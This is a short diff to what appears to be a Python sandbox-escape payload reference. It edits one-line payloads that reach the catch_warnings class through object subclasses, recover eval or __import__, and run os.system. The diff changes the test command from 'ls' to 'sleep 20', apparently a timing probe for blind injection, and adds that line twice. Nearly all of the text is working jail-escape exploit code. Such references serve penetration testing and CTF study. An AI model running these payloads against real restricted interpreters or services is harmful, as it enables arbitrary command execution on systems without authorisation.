@@ -197,7 +197,7 @@ i=()
 
 
 # 3 : Execute recovering eval symbol (class 59 is <class 'warnings.catch_warnings'>)
-().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]["eval"]("__import__('os').system('ls')")
+().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]["eval"]("__import__('os').system('sleep 20')")
 
 
 
@@ -222,7 +222,8 @@ i=().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__impor
 ##### Steps : First restore "builtins", then import "builtin" and them use builtin to import "os"
 __builtins__=([x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__)
 __builtin__=__builtins__["__import__"]('__builtin__')
-__builtin__.__dict__['__import__']('os').system(ls')
+__builtin__.__dict__['__import__']('os').system('sleep 20')
+__builtin__.__dict__['__import__']('os').system('sleep 20')
 
 
 # Or you could obtain the builtins from a defined function
